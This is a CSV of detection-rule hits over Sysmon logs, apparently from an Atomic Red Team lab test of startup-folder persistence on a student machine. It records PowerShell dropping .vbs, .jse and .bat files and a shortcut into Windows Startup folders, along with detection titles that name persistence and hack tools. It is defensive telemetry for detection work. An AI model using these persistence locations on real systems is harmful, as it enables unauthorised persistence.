"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:19:37.190 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173666,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-GB --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=2400,i,2904374366359068948,10761809149815589804,524288 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708990060038890 --mojo-platform-channel-handle=2408 /prefetch:13 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 7412 ¦ PGUID: E9F06A57-6137-694E-AF01-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:35.313","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:37.594 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173667,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --dma-cps-flags=0 --no-pre-read-main-dll --video-capture-use-gpu-memory-buffer --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --js-flags=""--expose-gc --ms-user-locale=en_AT"" --time-ticks-at-unix-epoch=-1766744020184809 --launch-time-ticks=357388711 --ram-no-pressure-read-main-dll --metrics-shmem-handle=4148,i,6624907468847911838,17620248791250603262,2097152 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=4172 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb /prefetch:1 ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 3260 ¦ PGUID: E9F06A57-6139-694E-B101-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:37.584","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:38.079 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173668,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --dma-cps-flags=0 --no-pre-read-main-dll --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=6 --js-flags=""--expose-gc --ms-user-locale=en-GB"" --time-ticks-at-unix-epoch=-1766744020184809 --launch-time-ticks=357700571 --skip-read-main-dll --metrics-shmem-handle=4576,i,10348090180856656646,16662829430924015031,2097152 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708991934122588 --mojo-platform-channel-handle=4596 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb /prefetch:1 ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 8860 ¦ PGUID: E9F06A57-6139-694E-B201-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:37.928","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:38.792 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173669,"Query: wpad ¦ Result: - ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ PID: 1240 ¦ PGUID: E9F06A57-6136-694E-AE01-000000002400","QueryStatus: 9003 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:37.889","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173573,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.431","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173577,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173585,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.807","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.813 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173589,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173598,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.603","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","Creation Of a Suspicious ADS File Outside a Browser Download","med","DESKTOP-G2OBL3D","Sysmon",15,"Evas","","sysmon",173602,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.615","create_stream_hash_creation_internet_file.yml","800a753c-045e-a840-1c7b-2c7e746e2e9b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","HackTool - Powerup Write Hijack DLL","high","DESKTOP-G2OBL3D","Sysmon",11,"Persis ¦ PrivEsc ¦ Evas","T1574.001","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_hktl_powerup_dllhijacking.yml","bde02a5c-5a5c-2601-fb4c-64f6ea900bd3","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","HackTool - Powerup Write Hijack DLL","high","DESKTOP-G2OBL3D","Sysmon",11,"Persis ¦ PrivEsc ¦ Evas","T1574.001","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_hktl_powerup_dllhijacking.yml","bde02a5c-5a5c-2601-fb4c-64f6ea900bd3","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173570,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173574,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Potential Binary Or Script Dropper Via PowerShell","med","DESKTOP-G2OBL3D","Sysmon",11,"Persis","","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_powershell_drop_binary_or_script.yml","ef64fe9a-89fc-6623-4977-ce889d903f94","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.507 +01:00","Potential Startup Shortcut Persistence Via PowerShell.EXE","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173607,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:06.506 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.506","file_event_win_powershell_startup_shortcuts.yml","aac86f22-df36-b4f9-c1ce-3460d087ee56","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173570,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173572,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.427","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173574,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173576,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.803 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173582,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.802","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.806 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173584,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.803","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173586,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.809","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
